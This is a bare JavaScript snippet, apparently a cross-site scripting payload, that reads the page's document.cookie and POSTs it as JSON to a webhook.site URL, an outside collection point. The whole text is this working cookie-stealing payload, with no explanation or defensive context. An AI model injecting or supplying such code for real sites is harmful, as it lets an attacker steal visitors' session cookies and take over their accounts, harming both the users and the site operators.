fetch('https://webhook.site/48e25e07-09e6-41a3-91b0-9354f5571e13', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    data: document.cookie
  })
})

